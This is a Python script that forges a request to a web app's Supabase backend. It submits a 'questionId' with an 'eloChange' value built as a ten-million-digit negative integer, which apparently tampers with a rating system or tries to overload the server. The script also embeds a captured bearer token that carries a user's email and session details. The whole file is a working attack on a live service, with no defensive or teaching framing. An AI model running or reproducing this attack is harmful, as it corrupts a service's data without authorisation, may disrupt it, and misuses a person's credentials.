import sys
sys.set_int_max_str_digits(1000000000)

x = "-10"
y = x + "0" * (10000000 - 2)
z = int(y)

import requests

url = "https://kqarhesayyvtbakgpaqr.supabase.co/functions/v1/make-server-0b50860a/question/complete"

headers = {
    "Host": "kqarhesayyvtbakgpaqr.supabase.co",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer": "https://elov.vercel.app/",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6InAxQXkxY01GNWFyaEd2d0YiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2txYXJoZXNheXl2dGJha2dwYXFyLnN1cGFiYXNlLmNvL2F1dGgvdjEiLCJzdWIiOiJhMWMwMjIzNi03YmE1LTQ1MzMtYmUwZi02MWRiYjcxYTIxYTYiLCJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzY0MzE0MTMyLCJpYXQiOjE3NjQzMTA1MzIsImVtYWlsIjoiY2xpbWllYWxleEBnbWFpbC5jb20iLCJwaG9uZSI6IiIsImFwcF9tZXRhZGF0YSI6eyJwcm92aWRlciI6ImVtYWlsIiwicHJvdmlkZXJzIjpbImVtYWlsIl19LCJ1c2VyX21ldGFkYXRhIjp7ImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJ1c2VybmFtZSI6ImNvcmJpbiJ9LCJyb2xlIjoiYXV0aGVudGljYXRlZCIsImFhbCI6ImFhbDEiLCJhbXIiOlt7Im1ldGhvZCI6InBhc3N3b3JkIiwidGltZXN0YW1wIjoxNzY0MjY4NDI4fV0sInNlc3Npb25faWQiOiIxZTgwNDIwMi01YzI1LTQ0MzctYjlhOS1mZDZjN2YwMDUyM2QiLCJpc19hbm9ueW1vdXMiOmZhbHNlfQ.6XNk8KImzoL7fe0Cijegx5siaMX0qP629vTy5SfZp-A",
    "Content-Type": "application/json",
    "Origin": "https://elov.vercel.app",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "Priority": "u=4",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
}

data = {
    "questionId": 62,
    "eloChange": z
}

response = requests.post(url, headers=headers, json=data)
print("Status:", response.status_code)
print("Response:")
print(response.text)
